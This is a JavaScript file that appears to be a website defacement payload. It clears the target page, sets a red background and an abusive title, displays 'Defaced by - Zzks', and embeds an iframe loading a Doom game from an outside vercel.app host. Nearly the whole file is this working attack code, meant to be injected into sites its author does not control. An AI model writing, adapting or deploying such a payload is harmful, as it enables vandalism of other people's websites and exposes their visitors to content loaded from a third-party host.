/* Configuration */
const ClearPage = true;

const GameResolutionWidth = 800;
const GameResolutionHeight = 600;
const GameFullScreen = false;

const ShowText = true;
const TextToShow = 'Defaced by - Zzks'

const InjectHtml = false;
const InnerHtml = '<h1>Hi there</h1>'

const ChangeBackgroundColor = true;
const BackgroundColor = "rgb(114, 0, 0)"

const ChangePageTitle = true;
const PageTitle = "Dommed. Scream, motherfucker!"

function ChangeBodyAspects() {
    if (ChangeBackgroundColor)
        document.body.style.backgroundColor = BackgroundColor;

    if (ClearPage)
        document.body.innerHTML = '';

    if (InjectHtml)
        document.body.innerHTML = InnerHtml;

    if (ChangePageTitle)
        document.title = PageTitle;

    // Centralizando o conteúdo (texto já está centralizado)
    document.body.style.display = 'flex';
    document.body.style.justifyContent = 'center';
    document.body.style.alignItems = 'center';
    document.body.style.height = '100vh';
    document.body.style.margin = '0';
    document.body.style.flexDirection = 'column'; // Para garantir que o texto fique acima do iframe
}

function ShowTextOnDOM() {
    var h1 = document.createElement('h1');
    h1.style.textAlign = 'center';
    h1.style.color = 'white';
    h1.style.fontSize = '24px'
    h1.style.fontFamily = 'verdana'
    h1.style.fontWeight = '1000'

    if (ShowText)
        h1.textContent = TextToShow;

    document.body.appendChild(h1);
}

function CreateGameIframe() {
    var iframe = document.createElement('iframe');
    iframe.src = 'https://doomonline1.vercel.app/dos.html';
    iframe.id = "Doom";

    iframe.height = GameResolutionHeight;
    iframe.width = GameResolutionWidth;
    iframe.allowFullscreen = GameFullScreen;

    // Ajustando o estilo do iframe para garantir que ele fique centralizado
    iframe.style.marginTop = '20px'; // Pequeno espaço entre o texto e o iframe

    document.body.appendChild(iframe);
}

ChangeBodyAspects();
ShowTextOnDOM();
CreateGameIframe();
